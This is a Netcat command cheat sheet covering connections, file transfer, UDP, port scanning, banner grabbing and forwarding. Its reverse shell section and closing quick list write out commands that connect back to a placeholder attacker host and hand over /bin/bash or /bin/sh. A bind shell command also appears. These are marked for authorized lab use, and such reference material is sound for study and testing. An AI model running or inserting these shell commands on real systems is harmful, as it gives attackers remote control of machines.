# � Netcat (nc) Cheat Sheet

> **Filename suggestion:** `NETCAT_CHEATSHEET.md`  
> **Netcat** — the "Swiss army knife" of networking. Use it to read/write data across network connections using TCP or UDP.  
> **Security note:** Commands that open shells, forward ports, or transfer data must be used **only** on systems you own or are authorized to test.

---

## ⚙️ Basic syntax
```
nc [options] [host] [port]
```

---

## � Common options (varies by implementation: GNU netcat, OpenBSD netcat, Ncat)
| Option | Meaning |
|--------|---------|
| `-l` | Listen mode (server) |
| `-p <port>` | Local port (used with `-l`) |
| `-u` | Use UDP (default is TCP) |
| `-v` / `-vv` | Verbose / very verbose |
| `-n` | Numeric-only (no DNS lookups) |
| `-z` | Zero-I/O mode — for port scanning (no data sent) |
| `-w <sec>` | Timeout for connects and final net reads |
| `-e <program>` | Execute program after connect (often disabled for security) |
| `-k` | Keep listening after client disconnects (use with `-l`) |
| `-q <sec>` | Quit after EOF on stdin and specified delay (GNU netcat) |
| `-s <addr>` | Use specific source address |
| `-C` | Send CRLF as line-ending (some variants) |
| `-S` | TCP MD5 signature (rare/specialized) |
| `-X` / `-x` | Proxy options (in some builds) |

> **Note:** Flags differ between implementations (OpenBSD `nc`, GNU `netcat`, Ncat from Nmap). Check `man nc` / `nc --help` for your version.

---

## � Simple client connection
Connect to a host/port:
```bash
nc example.com 80
```
Use it to send raw requests (HTTP, SMTP, etc.):
```
GET / HTTP/1.1
Host: example.com

```

---

## �️ Simple server (chat/demo)
**Server (listen):**
```bash
nc -l -p 1234
```
**Client (connect):**
```bash
nc 192.168.1.100 1234
```
Type messages between terminals.

---

## � File transfer (TCP)
**Sender (server)** — listen and send file to the first client that connects:
```bash
nc -l -p 4444 < myfile.tar.gz
```
**Receiver (client)** — connect and write to disk:
```bash
nc <server_ip> 4444 > myfile.tar.gz
```

**With progress (pv):**
```bash
pv myfile.tar.gz | nc -l -p 4444
# client
nc server_ip 4444 > myfile.tar.gz
```

---

## � UDP examples
**Listen on UDP port 9999:**
```bash
nc -u -l -p 9999
```
**Send UDP datagram:**
```bash
echo "hello" | nc -u target_ip 9999
```

Note: UDP is connectionless — ordering and delivery are not guaranteed.

---

## � Port scanning (quick)
Scan ports 20–1024:
```bash
nc -zv 192.168.1.1 20-1024
```
`-z` = zero I/O (no data); `-v` = verbose (shows open/closed).  
For more advanced scanning use `nmap`.

---

## � Banner grabbing / service detection
Grab an SMTP banner:
```bash
nc -nv mail.example.com 25
```
Grab HTTP headers:
```bash
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv example.com 80
```

---


## � Reverse shell (for lab/testing only)
**Attacker (listener):**
```bash
nc -l -p 4444
```
**Target (connect back):**
```bash
nc <attacker_ip> 4444 -e /bin/bash
```
> Many `nc` builds (e.g., OpenBSD) disable `-e`. Alternative using FIFO:
```bash
mkfifo /tmp/f; nc <attacker_ip> 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

---


## � Bind shell (listen on target)
**On target:**
```bash
nc -l -p 4444 -e /bin/bash
```
**On attacker:**
```bash
nc <target_ip> 4444
```
> Bind shells expose a listening service on the target — can be blocked by firewalls.

---

## � Port forwarding / proxying (simple)
Netcat alone doesn't do robust transparent proxying, but you can chain connections:
```bash
# Forward local port 8080 to remote host:80 via an intermediate host
# On intermediate host:
mkfifo backpipe
nc -l -p 8080 < backpipe | nc target_host 80 > backpipe
```
For production-grade port forwarding use `ssh -L`/`ssh -R`, `socat`, or dedicated proxies.

---

## � Misc useful commands
- **Repeat last command**: use shell history (`!!`) not nc-specific.  
- **Show local listening ports**: `ss -tuln` or `netstat -tuln`.  
- **Combine with `openssl`** for TLS:
```bash
# Server: listen and upgrade to TLS (requires openssl and cert/key)
openssl s_server -accept 8443 -cert cert.pem -key key.pem -quiet
# Client:
openssl s_client -connect server:8443
```

---

## ⚠️ Security & best practices
- Never run reverse/bind shells against systems you don't own or have permission to test.  
- Prefer secure alternatives (SSH, mutual TLS).  
- Modern `nc` variants may restrict dangerous options (`-e`). Use `socat` for more advanced, secure setups.  
- Be aware of firewall/NAT behaviors — they may block or translate ports.

---

## � Troubleshooting tips
- If `-e` is missing, check your `nc` version (`nc --version` or `man nc`).  
- Use `-vv` to increase verbosity for debugging.  
- For firewall issues, verify with `iptables -L` / Windows Firewall rules.  
- For file transfer issues, confirm no intermediate device is altering stream (anti-virus, proxies).

---

## � References / further reading
- `man nc` (your system)  
- Ncat (from Nmap): https://nmap.org/ncat/  
- `socat` documentation for advanced piping and forwarding.

---


## ✅ Quick examples cheat list
```bash
# Simple connect
nc example.com 80

# Simple listen
nc -l -p 1234

# File send (server)
nc -l -p 4444 < myfile.gz

# File receive (client)
nc server_ip 4444 > myfile.gz

# UDP listen
nc -u -l -p 9999

# Port scan
nc -zv 192.168.1.1 20-1024

# Banner grab
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv example.com 80

# Reverse shell (if supported)
nc attacker_ip 4444 -e /bin/bash
```

---

*End of cheat sheet.*
